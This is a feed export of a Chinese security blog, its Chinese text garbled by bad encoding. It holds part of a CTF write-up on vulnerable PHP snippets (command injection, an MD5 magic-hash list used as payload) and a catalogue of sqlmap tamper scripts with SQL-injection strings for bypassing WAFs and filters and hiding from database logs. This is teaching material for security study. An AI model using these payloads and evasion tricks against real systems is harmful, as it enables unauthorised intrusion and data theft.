&#123;</span><br><span class="line">            $params[] = $parameters[$index];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> implode($params, <span class="string">' '</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cmd = (<span class="keyword">new</span> ParamExtractor())-&gt;getCommand($_GET[<span class="string">'p'</span>]);</span><br><span class="line">system(<span class="string">'resizeImg image.png '</span> . $cmd);</span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-20"><a href="#åˆ†æ-20" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><h2 id="22-Chimney"><a href="#22-Chimney" class="headerlink" title="22 - Chimney"></a>22 - Chimney</h2><blockquote><p>é­”æ³•å“ˆå¸Œ</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">'hash'</span>, md5($_POST[<span class="string">'password'</span>]));</span><br><span class="line">    header(<span class="string">"Refresh: 0"</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$password = <span class="string">'0e836584205638841937695747769655'</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">'hash'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;form&gt;&lt;input type="password" name="password" /&gt;'</span></span><br><span class="line">        . <span class="string">'&lt;input type="submit" value="Login" &gt;&lt;/form &gt;'</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span> (md5($_COOKIE[<span class="string">'hash'</span>]) == $password) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Login succeeded'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Login failed'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-21"><a href="#åˆ†æ-21" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>æ³¨æ„è¿™æœ‰ä¸€ä¸ª <code>==</code>ï¼Œæ¯”è¾ƒæ—¶ä¼šè‡ªåŠ¨è¿›è¡Œç±»å‹è½¬æ¢ï¼Œè€Œç»™çš„ <code>password</code> æ˜¯ <code>0e</code> å¼€å¤´</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="string">'0e836584205638841937695747769655'</span>==<span class="string">'0e'</span>);</span><br><span class="line"><span class="comment">// bool(true)</span></span><br></pre></td></tr></table></figure><h3 id="payload-18"><a href="#payload-18" class="headerlink" title="payload"></a>payload</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0</span>e830400451993494058<span class="number">024219903391</span></span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0</span>e342768416822451524<span class="number">974117254469</span></span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0</span>e8482404488305379244<span class="number">65865611904</span></span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0</span>e5459932745177090343<span class="number">28855841020</span></span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0</span>e9406242178565615578<span class="number">16327384675</span></span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0</span>e5093672134182067008<span class="number">42008763514</span></span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0</span>e4810364908676611132<span class="number">60034900752</span></span><br><span class="line"></span><br><span class="line">s1184209335a</span><br><span class="line"><span class="number">0</span>e072485820392773389<span class="number">523109082030</span></span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0</span>e731198061491163073<span class="number">197128363787</span></span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0</span>e8615801632915612474<span class="number">04381396064</span></span><br><span class="line"></span><br><span class="line">s532378020a</span><br><span class="line"><span class="number">0</span>e220463095855511507<span class="number">588041205815</span></span><br></pre></td></tr></table></figure><h2 id="23-Cookies"><a href="#23-Cookies" class="headerlink" title="23 - Cookies"></a>23 - Cookies</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LDAPAuthenticator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $conn;</span><br><span class="line">    <span class="keyword">public</span> $host;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($host = <span class="string">"localhost"</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;host = $host;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">authenticate</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">        $result = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;conn = ldap_connect(<span class="keyword">$this</span>-&gt;host);</span><br><span class="line">        ldap_set_option(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;conn,</span><br><span class="line">            LDAP_OPT_PROTOCOL_VERSION,</span><br><span class="line">            <span class="number">3</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (!@ldap_bind(<span class="keyword">$this</span>-&gt;conn))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        $user = ldap_escape($user, <span class="keyword">null</span>, LDAP_ESCAPE_DN);</span><br><span class="line">        $pass = ldap_escape($pass, <span class="keyword">null</span>, LDAP_ESCAPE_DN);</span><br><span class="line">        $result = ldap_search(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;conn,</span><br><span class="line">            <span class="string">""</span>,</span><br><span class="line">            <span class="string">"(&amp;(uid=$user)(userPassword=$pass))"</span></span><br><span class="line">        );</span><br><span class="line">        $result = ldap_get_entries(<span class="keyword">$this</span>-&gt;conn, $result);</span><br><span class="line">        <span class="keyword">return</span> ($result[<span class="string">"count"</span>] &gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"u"</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">"p"</span>])) &#123;</span><br><span class="line">    $ldap = <span class="keyword">new</span> LDAPAuthenticator();</span><br><span class="line">    <span class="keyword">if</span> ($ldap-&gt;authenticate($_GET[<span class="string">"u"</span>], $_GET[<span class="string">"p"</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"You are now logged in!"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Username or password unknown!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-22"><a href="#åˆ†æ-22" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><h2 id="24-Nutcracker"><a href="#24-Nutcracker" class="headerlink" title="24 - Nutcracker"></a>24 - Nutcracker</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@$GLOBALS = $GLOBALS&#123;next&#125; </span><br><span class="line">= next($GLOBALS&#123;<span class="string">'GLOBALS'</span>&#125;)[$GLOBALS[<span class="string">'next'</span>][<span class="string">'next'</span>] </span><br><span class="line">= next($GLOBALS)[<span class="string">'GLOBALS'</span>]][$next[<span class="string">'GLOBALS'</span>] </span><br><span class="line">= next($GLOBALS[GLOBALS][<span class="string">'GLOBALS'</span>])[$next[<span class="string">'next'</span>]]][$next[<span class="string">'GLOBALS'</span>] </span><br><span class="line">= next($next[<span class="string">'GLOBALS'</span>])][$GLOBALS[next][<span class="string">'next'</span>]($GLOBALS[<span class="string">'next'</span>]&#123;<span class="string">'GLOBALS'</span>&#125;)] </span><br><span class="line">= next(neXt($&#123;<span class="string">'next'</span>&#125;[<span class="string">'next'</span>]));</span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-23"><a href="#åˆ†æ-23" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;æœ‰æ„æ€ä¸€ç‚¹çš„ä¼˜å…ˆåšäº†ï¼Œæœ‰æ—¶é—´å†æ›´æ–°ã€‚&lt;/p&gt;
&lt;h2 id=&quot;1-Wish-List&quot;&gt;&lt;a href=&quot;#1-Wish-List&quot; class=&quot;headerlink&quot; title=&quot;1 - Wish List&quot;&gt;&lt;/a&gt;1 - Wish List&lt;/h2&gt;&lt;blockq
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap tamper åˆ—è¡¨</title>
    <link href="https://wywwzjj.top/2019/03/01/sqlmap-tamper-%E5%88%97%E8%A1%A8/"/>
    <id>https://wywwzjj.top/2019/03/01/sqlmap-tamper-åˆ—è¡¨/</id>
    <published>2019-03-01T15:43:38.000Z</published>
    <updated>2019-05-02T03:17:38.538Z</updated>
    
    <content type="html"><![CDATA[<h2 id="apostrophemask-py"><a href="#apostrophemask-py" class="headerlink" title="apostrophemask.py"></a>apostrophemask.py</h2><blockquote><p>return payload.replace(â€˜â€™â€™, â€œ%EF%BC%87â€) if payload else payload</p></blockquote><p>å°†å•å¼•å· url ç¼–ç ï¼Œç”¨äºè¿‡æ»¤äº†å•å¼•å·çš„æƒ…å†µã€‚</p><blockquote><p>1â€™ AND â€˜1â€™=â€™1 <strong>to</strong> 1%EF%BC%87 AND %EF%BC%871%EF%BC%87=%EF%BC%871</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>ALL</p><h2 id="apostrophenullencode-py"><a href="#apostrophenullencode-py" class="headerlink" title="apostrophenullencode.py"></a>apostrophenullencode.py</h2><blockquote><p>return payload.replace(â€˜â€™â€™, â€œ%00%27â€) if payload else payload</p></blockquote><p>å°†å•å¼•å·æ›¿æ¢ä¸ºå®½å­—èŠ‚ unicode å­—ç¬¦ï¼Œç”¨äºè¿‡æ»¤äº†å•å¼•å·çš„æƒ…å†µ</p><blockquote><p>1â€™ AND â€˜1â€™=â€™1 <strong>to</strong> 1ï¿½â€™ AND ï¿½â€™1ï¿½â€™=ï¿½â€™1</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>ALL</p><h2 id="appendnullbyte-py"><a href="#appendnullbyte-py" class="headerlink" title="appendnullbyte.py"></a>appendnullbyte.py</h2><blockquote><p>return â€œ%s%%00â€ % payload if payload else payload</p></blockquote><p>åœ¨ä½ æ„é€ çš„payloadåé¢åŠ ä¸€ä¸ªç©ºå­—ç¬¦</p><blockquote><p>1â€™ AND â€˜1â€™=â€™1 <strong>to</strong> 1â€™ AND â€˜1â€™=â€™1[]</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>Access</p><h2 id="base64encode-py"><a href="#base64encode-py" class="headerlink" title="base64encode.py"></a>base64encode.py</h2><blockquote><p>return base64.b64encode(payload.encode(UNICODE_ENCODING)) if payload else payload</p></blockquote><p>è¿™ä¸ªçœ‹æ¨¡å—åä¹ŸçŸ¥é“æ˜¯ base64 ç¼–ç </p><blockquote><p>1â€™ AND â€˜1â€™=â€™1 <strong>to</strong> MScgQU5EICcxJz0nMQ==</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>ALL</p><h2 id="between-py"><a href="#between-py" class="headerlink" title="between.py"></a>between.py</h2><p>è¿™ä¸ªä»£ç æœ‰ç‚¹é•¿ï¼Œå°±ä¸è´´ä»£ç äº†ï¼Œå¯ä»¥è‡ªå·±å»æŸ¥çœ‹ï¼š</p><p><code>\SQLMap\tamper\between.py</code></p><p>å°†å¤§äºç¬¦å·å’Œç­‰å·ç”¨ between è¯­å¥æ›¿æ¢ï¼Œç”¨äºè¿‡æ»¤äº†å¤§äºç¬¦å·å’Œç­‰å·çš„æƒ…å†µ</p><blockquote><p>1 AND A &gt; B <strong>to</strong> 1 AND A NOT BETWEEN 0 AND B</p><p>1 AND A = B <strong>to</strong> 1 AND A BETWEEN B AND B</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>ALL</p><h2 id="bluecoat-py"><a href="#bluecoat-py" class="headerlink" title="bluecoat.py"></a>bluecoat.py</h2><p>ç”¨éšæœºçš„ç©ºç™½å­—ç¬¦ä»£æ›¿ç©ºæ ¼ï¼Œå¹¶ä¸”å°†ç­‰å·æ›¿æ¢ä¸º like ï¼Œç”¨äºè¿‡æ»¤äº†ç©ºæ ¼å’Œç­‰å·çš„æƒ…å†µ</p><blockquote><p>union select <em>from users where id = 1 <strong>to</strong> union%09select</em> from%09users where id like 1</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>MySQL 5.1, SGOS</p><h2 id="chardoubleencode-py"><a href="#chardoubleencode-py" class="headerlink" title="chardoubleencode.py"></a>chardoubleencode.py</h2><p>ç”¨ url ç¼–ç ä¸¤æ¬¡ä½ çš„ payload</p><blockquote><p>select * from users <strong>to</strong>%2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2575%2573%2565%2572</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>ALL</p><h2 id="charencode-py"><a href="#charencode-py" class="headerlink" title="charencode.py"></a>charencode.py</h2><p>ç”¨ url ç¼–ç ä¸€æ¬¡ä½ çš„ payload</p><blockquote><p>select * from users <strong>to</strong>%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>ALL</p><h2 id="charunicodeencode-py"><a href="#charunicodeencode-py" class="headerlink" title="charunicodeencode.py"></a>charunicodeencode.py</h2><p>ç”¨ unicode ç¼–ç  payload ï¼Œåªç¼–ç éç¼–ç å­—ç¬¦</p><blockquote><p>select * from users <strong>to</strong>u0073u0065u006cu0065u0063u0074u0020u002au0020u0066u0072u006fu006du0020u0075u0073u0065u0072u0073</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>ALLï¼Œä½†æ˜¯éœ€è¦ asp å’Œ asp.net ç¯å¢ƒ</p><h2 id="commalesslimit-py"><a href="#commalesslimit-py" class="headerlink" title="commalesslimit.py"></a>commalesslimit.py</h2><p>å°† payload ä¸­çš„é€—å·ç”¨ offset ä»£æ›¿ï¼Œç”¨äºè¿‡æ»¤äº†é€—å·å¹¶ä¸”æ˜¯ä¸¤ä¸ªå‚æ•°çš„æƒ…å†µ</p><blockquote><p>limit 2,1 <strong>to</strong> limit 1 offset 2</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>MySQL</p><h2 id="commalessmid-py"><a href="#commalessmid-py" class="headerlink" title="commalessmid.py"></a>commalessmid.py</h2><p>å°† payload ä¸­çš„é€—å·ç”¨ from for ä»£æ›¿ï¼Œç”¨äºè¿‡æ»¤äº†é€—å·å¹¶ä¸”æ˜¯ä¸‰å‚æ•°çš„æƒ…å†µ</p><blockquote><p>mid(version(), 1, 1) <strong>to</strong> mid(version() from 1 for 1)</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>MySQL</p><h2 id="commentbeforeparentheses-py"><a href="#commentbeforeparentheses-py" class="headerlink" title="commentbeforeparentheses.py"></a>commentbeforeparentheses.py</h2><blockquote><p>retVal = re.sub(râ€b(w+)(â€œ, â€œg&lt;1&gt;/**/(â€œ, retVal)</p></blockquote><p>åœ¨æŸä¸ªå•è¯åçš„ç¬¬ä¸€ä¸ªæ‹¬å·å‰é¢åŠ å…¥ /**/ ï¼Œç”¨äºè¿‡æ»¤äº†å‡½æ•°çš„æƒ…å†µ</p><blockquote><p>union select group_concat(table_name) <strong>to</strong> union select group_concat/**/(table_name)</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>ALL</p><h2 id="concat2concatws-py"><a href="#concat2concatws-py" class="headerlink" title="concat2concatws.py"></a>concat2concatws.py</h2><blockquote><p>payload = payload.replace(â€œCONCAT(â€œ, â€œCONCAT_WS(MID(CHAR(0),0,0),â€)</p></blockquote><p>ç”¨äºè¿‡æ»¤äº† concat å‡½æ•°çš„æƒ…å†µ</p><blockquote><p>concat(1,2) <strong>to</strong> concat_ws(mid(char(0), 0, 0), 1, 2)</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>MySQL</p><h2 id="equaltolike-py"><a href="#equaltolike-py" class="headerlink" title="equaltolike.py"></a>equaltolike.py</h2><blockquote><p>retVal = re.sub(râ€s<em>=s</em>â€œ, â€œ LIKE â€œ, retVal)</p></blockquote><p>å°†ç­‰å·ç”¨ like ä»£æ›¿ï¼Œç”¨äºè¿‡æ»¤äº†ç­‰å·çš„æƒ…å†µ</p><blockquote><p>select <em>from users where id=1 <strong>to</strong> select</em> from users where id like 1</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>ALL</p><h2 id="escapequotes-py"><a href="#escapequotes-py" class="headerlink" title="escapequotes.py"></a>escapequotes.py</h2><blockquote><p>return payload.replace(â€œâ€˜â€œ, â€œâ€˜â€œ).replace(â€˜â€œâ€˜, â€˜â€œâ€˜)</p></blockquote><p>å°†å•å¼•å·è½¬æ¢æˆ &#39; ï¼ŒåŒå¼•å·è½¬æ¢æˆ &quot; ï¼Œç”¨äºè¿‡æ»¤äº†å•å¼•å·æˆ–åŒå¼•å·çš„æƒ…å†µ</p><blockquote><p>1â€™ and 1=1â€“+ <strong>to</strong> 1&#39; and 1=1â€“+</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>ALL</p><h2 id="greatest-py"><a href="#greatest-py" class="headerlink" title="greatest.py"></a>greatest.py</h2><p>ç”¨ greatest ä»£æ›¿å¤§äºç¬¦å·ï¼Œç”¨äºå¤§äºç¬¦å·è¢«è¿‡æ»¤äº†çš„æƒ…å†µ</p><blockquote><p>1 and a&gt;b <strong>to</strong> 1 and greatest(a,b+1)=a</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>ALL</p><h2 id="halfversionedmorekeywords-py"><a href="#halfversionedmorekeywords-py" class="headerlink" title="halfversionedmorekeywords.py"></a>halfversionedmorekeywords.py</h2><p>åœ¨å…³é”®å­—å‰æ·»åŠ æ³¨é‡Šï¼Œç”¨äºè¿‡æ»¤äº†å…³é”®å­—çš„æƒ…å†µ</p><blockquote><p>union select 1,2 <strong>to</strong> /<em>!0union/</em>!0select 1,2</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>MySQL &lt; 5.1</p><h2 id="htmlencode-py"><a href="#htmlencode-py" class="headerlink" title="htmlencode.py"></a>htmlencode.py</h2><blockquote><p>return re.sub(râ€<a href="http://www.myh0st.cn/index.php/archives/881/#fn-1" target="_blank" rel="noopener">1</a>â€œ, lambda match: â€œ&amp;#%d;â€ % ord(match.group(0)), payload) if payload else payload</p></blockquote><p>ä»åå­—å°±çŸ¥é“æ˜¯å°† payload è¿›è¡Œ html ç¼–ç </p><blockquote><p>1â€™ and 1=1â€“+ <strong>to</strong> 1â€™ and 1=1â€“+</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>ALL</p><h2 id="ifnull2ifisnull-py"><a href="#ifnull2ifisnull-py" class="headerlink" title="ifnull2ifisnull.py"></a>ifnull2ifisnull.py</h2><p>å°† ifnull() å‡½æ•°è½¬ä¸º if(isnull()) å‡½æ•°ï¼Œç”¨äºè¿‡æ»¤äº† ifnull å‡½æ•°çš„æƒ…å†µ</p><blockquote><p>ifnull(1, 2) <strong>to</strong> if(isnull(1), 2, 1)</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>MySql</p><h2 id="informationschemacomment-py"><a href="#informationschemacomment-py" class="headerlink" title="informationschemacomment.py"></a>informationschemacomment.py</h2><blockquote><p>retVal = re.sub(râ€(?i)(information_schema).â€, â€œg&lt;1&gt;/**/.â€, payload)</p></blockquote><p>åœ¨ information_schema åé¢åŠ ä¸Š /**/ ï¼Œç”¨äºç»•è¿‡å¯¹ information_schema çš„æƒ…å†µ</p><blockquote><p>select table_name from information_schema.tables <strong>to</strong> select table_name from information_schema/**/.tables</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>ALL</p><h2 id="lowercase-py"><a href="#lowercase-py" class="headerlink" title="lowercase.py"></a>lowercase.py</h2><p>å°† payload é‡Œçš„å¤§å†™è½¬ä¸ºå°å†™</p><blockquote><p>UNION SELECT <strong>to</strong> union select</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>ALL</p><h2 id="modsecurityversioned-py"><a href="#modsecurityversioned-py" class="headerlink" title="modsecurityversioned.py"></a>modsecurityversioned.py</h2><p>ç”¨æ³¨é‡Šæ¥åŒ…å›´å®Œæ•´çš„æŸ¥è¯¢è¯­å¥ï¼Œç”¨äºç»•è¿‡ ModSecurity å¼€æº waf</p><blockquote><p>1 and 2&gt;1â€“+ <strong>to</strong> 1 /<em>!30874and 2&gt;1</em>/â€“+</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>MySQL</p><h2 id="modsecurityzeroversioned-py"><a href="#modsecurityzeroversioned-py" class="headerlink" title="modsecurityzeroversioned.py"></a>modsecurityzeroversioned.py</h2><p>ç”¨æ³¨é‡Šæ¥åŒ…å›´å®Œæ•´çš„æŸ¥è¯¢è¯­å¥ï¼Œç”¨äºç»•è¿‡ waf ï¼Œå’Œä¸Šé¢ç±»ä¼¼</p><blockquote><p>1 and 2&gt;1â€“+ <strong>to</strong> 1 /<em>!00000and 2&gt;1</em>/â€“+</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>MySQL</p><h2 id="multiplespaces-py"><a href="#multiplespaces-py" class="headerlink" title="multiplespaces.py"></a>multiplespaces.py</h2><p>åœ¨å…³é”®å­—å‘¨å›´æ·»åŠ å¤šä¸ªç©ºæ ¼</p><blockquote><p>union select 1,2â€“+ <strong>to</strong> union select 1,2â€“+</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>ALL</p><h2 id="nonrecursivereplacement-py"><a href="#nonrecursivereplacement-py" class="headerlink" title="nonrecursivereplacement.py"></a>nonrecursivereplacement.py</h2><p>å…³é”®å­—åŒå†™ï¼Œå¯ç”¨äºå…³é”®å­—è¿‡æ»¤</p><blockquote><p>union select 1,2â€“+ <strong>to</strong> uniounionn selecselectt 1,2â€“+</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>ALL</p><h2 id="overlongutf8-py"><a href="#overlongutf8-py" class="headerlink" title="overlongutf8.py"></a>overlongutf8.py</h2><p>è¿™ä¸ªä¸æ˜¯å¾ˆæ‡‚ï¼Œä¹Ÿå»ç½‘ä¸Šæœäº†ä¸‹ï¼Œéƒ½è¯´æ˜¯â€è½¬æ¢ç»™å®šçš„ payload å½“ä¸­çš„æ‰€æœ‰å­—ç¬¦â€œï¼Œç±»ä¼¼ç©ºæ ¼å¤§äºå°äºè¿™ç§</p><blockquote><p>select field from table where 2&gt;1 <strong>to</strong></p><p>select%C0%AAfield%C0%AAfromtable%C0%AAwhere%C0%AA2%C0%BE1</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>ALL</p><h2 id="percentage-py"><a href="#percentage-py" class="headerlink" title="percentage.py"></a>percentage.py</h2><p>ç”¨ç™¾åˆ†å·æ¥ç»•è¿‡å…³é”®å­—è¿‡æ»¤ï¼Œå…·ä½“æ˜¯åœ¨å…³é”®å­—çš„æ¯ä¸ªå­—æ¯å‰é¢éƒ½åŠ ä¸€ä¸ªç™¾åˆ†å·</p><blockquote><p>select <em>from users <strong>to</strong> %s%e%l%e%c%t</em> %f%r%o%m %u%s%e%r%s</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>ALL, ä½†æ˜¯éœ€è¦ ASP ç¯å¢ƒ</p><h2 id="plus2concat-py"><a href="#plus2concat-py" class="headerlink" title="plus2concat.py"></a>plus2concat.py</h2><p>ç”¨ concat å‡½æ•°æ¥æ›¿ä»£åŠ å·ï¼Œç”¨äºåŠ å·è¢«è¿‡æ»¤çš„æƒ…å†µ</p><blockquote><p>select char(13)+char(114)+char(115) from user <strong>to</strong> select concat(char(113),char(114),char(115)) from user</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>SQL Server 2012+</p><h2 id="plus2fnconcat-py"><a href="#plus2fnconcat-py" class="headerlink" title="plus2fnconcat.py"></a>plus2fnconcat.py</h2><p>ç”¨ fn concat æ¥æ›¿ä»£åŠ å·ï¼Œå’Œä¸Šé¢ç±»ä¼¼</p><blockquote><p>select char(13)+char(114)+char(115) from user <strong>to</strong> select {fn concat({ fn concat(char(113),char(114))},char(115))} from user</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>Microsoft SQL Server 2008+</p><h2 id="randomcase-py"><a href="#randomcase-py" class="headerlink" title="randomcase.py"></a>randomcase.py</h2><p>å°† payload éšæœºå¤§å°å†™ï¼Œå¯ç”¨äºå¤§å°å†™ç»•è¿‡çš„æƒ…å†µ</p><blockquote><p>union select 1,2â€“+ <strong>to</strong> UniOn SElect 1,2â€“+</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>ALL</p><h2 id="randomcomments-py"><a href="#randomcomments-py" class="headerlink" title="randomcomments.py"></a>randomcomments.py</h2><p>åœ¨ payload çš„å…³é”®å­—ä¸­é—´éšæœºæ’å…¥ /**/ ï¼Œå¯ç”¨äºç»•è¿‡å…³é”®å­—è¿‡æ»¤</p><blockquote><p>union select 1,2â€“+ <strong>to</strong> un/<strong>/ion sele/</strong>/ct 1,2â€“+</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>ALL</p><h2 id="securesphere-py"><a href="#securesphere-py" class="headerlink" title="securesphere.py"></a>securesphere.py</h2><blockquote><p>return payload + â€œ and â€˜0havingâ€™=â€™0havingâ€™â€ if payload else payload</p></blockquote><p>åœ¨ payload åé¢åŠ å…¥å­—ç¬¦ä¸²ï¼Œå¯ä»¥è‡ªå®šä¹‰</p><blockquote><p>1â€™ and 1=1 <strong>to</strong> 1â€™ and 1=1 â€˜0havingâ€™=â€™0havingâ€™</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>ALL</p><h2 id="sp-password-py"><a href="#sp-password-py" class="headerlink" title="sp_password.py"></a>sp_password.py</h2><blockquote><p>retVal = â€œ%s%ssp_passwordâ€ % (payload, â€œâ€“ â€œ if not any(_ if <em>in payload else None for</em> in (â€˜#â€™, â€œâ€“ â€œ)) else â€œâ€)</p></blockquote><p>åœ¨ payload è¯­å¥åæ·»åŠ  ssp_password ï¼Œç”¨äºè¿·æƒ‘æ•°æ®åº“æ—¥å¿—</p><blockquote><p>1â€™ and 1=1â€“+ <strong>to</strong> 1 and 1=1â€“ 